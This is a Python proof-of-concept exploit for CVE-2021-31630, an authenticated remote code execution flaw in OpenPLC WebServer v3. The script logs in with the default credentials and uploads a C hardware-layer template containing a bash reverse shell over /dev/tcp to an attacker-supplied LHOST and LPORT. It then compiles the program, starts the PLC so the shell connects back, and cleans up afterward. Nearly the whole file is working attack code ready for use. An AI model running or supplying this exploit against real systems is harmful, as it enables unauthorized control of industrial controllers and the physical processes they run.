#!/usr/bin/env python3

import sys
import argparse
import requests
from time import sleep

parser = argparse.ArgumentParser()
parser.add_argument('url', help='Target URL with http(s)://')
parser.add_argument('-u', help='Username', default='openplc')
parser.add_argument('-p', help='Password', default='openplc')
parser.add_argument('-t', help='Request Timeout, increase if server is slow', default=20)
parser.add_argument('-lh', help='LHOST', required=True)
parser.add_argument('-lp', help='LPORT', required=True)
args = parser.parse_args()


sess_obj = requests.Session()

TARGET = args.url
if not TARGET.startswith('http://') and not TARGET.startswith('https://'):
    print('[-] Invalid target, URL expected.')
    sys.exit()
if TARGET.endswith('/'):
    TARGET = TARGET[:-1]
login_url = f'{TARGET}/login'
upload_url = f'{TARGET}/hardware'
compile_url = f'{TARGET}/compile-program?file=blank_program.st'
stop_url = f'{TARGET}/stop_plc'
start_url = f'{TARGET}/start_plc'
restore_url = f'{TARGET}/restore_custom_hardware'
TOUT = args.t
UNAME = args.u
PSSWD = args.p
LHOST = args.lh
LPORT = args.lp


def health(session):
    rqst = session.get(TARGET, timeout=TOUT)
    if rqst.status_code == 200:
        print('[+] Service is Online!')
    else:
        print(f'[-] Status : {rqst.status_code}')
        sys.exit()


def login(session, username, password):
    payload = {
        'username': username,
        'password': password
    }
    rqst = session.post(login_url, data=payload, timeout=TOUT)
    if rqst.status_code == 200:
        if 'Bad credentials' in rqst.text:
            print('[-] Invalid Credentials!')
            sys.exit()
        else:
            print('[+] Logged in!')
    else:
        print(f'[-] Status : {rqst.status_code}')
        sys.exit()


def upload(session):
    template = '''
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>

int ignored_bool_inputs[] = {-1};
int ignored_bool_outputs[] = {-1};
int ignored_int_inputs[] = {-1};
int ignored_int_outputs[] = {-1};

void initCustomLayer()
{
}

void updateCustomIn()
{
}

#define LHOST "<IP>"
#define LPORT "<PORT>"

void updateCustomOut()
{
    int pipefd[2];
    pid_t pid;

    if (pipe(pipefd) == -1) {
        exit(EXIT_FAILURE);
    }

    pid = fork();
    if (pid == -1) {
        exit(EXIT_FAILURE);
    }

    if (pid == 0) {
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        execl("/bin/bash", "/bin/bash", "-c", "/bin/bash -i >& /dev/tcp/" LHOST "/" LPORT " 0>&1 &", NULL);
        exit(EXIT_FAILURE);
    } else {
        close(pipefd[1]);
        wait(NULL);
    }
}
'''
    modded_template = template.replace('<IP>', LHOST).replace('<PORT>', LPORT).encode()
    payload = {
        'hardware_layer': (None, b'blank_linux'),
        'custom_layer_code': (None, modded_template)
    }
    rqst = session.post(upload_url, files=payload, timeout=TOUT)

    if rqst.status_code == 200:
        print('[+] Payload uploaded!')
        comp_rqst = session.get(compile_url, timeout=TOUT)
        if comp_rqst.status_code == 200:
            print('[+] Waiting for 5 seconds...')
            sleep(5)
            print('[+] Compilation successful!')
        else:
            print(f'[-] Status : {comp_rqst.status_code}')
            sys.exit()
    else:
        print(f'[-] Status : {rqst.status_code}')
        sys.exit()


def start(session):
    rqst = session.get(start_url, timeout=TOUT)
    if rqst.status_code == 200:
        print('[+] PLC Started! Check listener...')
    else:
        print(f'[-] Status : {rqst.status_code}')


def cleanup(session):
    stop_rqst = session.get(stop_url, timeout=TOUT)
    if stop_rqst.status_code == 200:
        print('[+] PLC Stopped!')
    else:
        print(f'Status : {stop_rqst.status_code}')
    clean_rqst = session.get(restore_url, timeout=TOUT)
    if clean_rqst.status_code == 200:
        sleep(10)
        print('[+] Cleanup successful!')
    else:
        print(f'Status : {clean_rqst.status_code}')
        sys.exit()


BANNER = '''
------------------------------------------------
--- CVE-2021-31630 -----------------------------
--- OpenPLC WebServer v3 - Authenticated RCE ---
------------------------------------------------

[>] Found By : Fellipe Oliveira
[>] PoC By   : thewhiteh4t [ https://twitter.com/thewhiteh4t ]
'''

print(BANNER)
print(f'[>] Target   : {TARGET}')
print(f'[>] Username : {UNAME}')
print(f'[>] Password : {PSSWD}')
print(f'[>] Timeout  : {TOUT} secs')
print(f'[>] LHOST    : {LHOST}')
print(f'[>] LPORT    : {LPORT}\n')

try:
    print('[!] Checking status...')
    health(sess_obj)
    print('[!] Logging in...')
    login(sess_obj, UNAME, PSSWD)
    sleep(1)
    print('[!] Restoring default program...')
    cleanup(sess_obj)
    sleep(1)
    print('[!] Uploading payload...')
    upload(sess_obj)
    print('[!] Starting PLC...')
    start(sess_obj)
    sleep(1)
    print('[!] Cleaning up...')
    cleanup(sess_obj)
except Exception as exc:
    print(f'[-] Exception : {exc}')
    sys.exit()
except KeyboardInterrupt:
    print('[!] Exiting...')
    sys.exit()
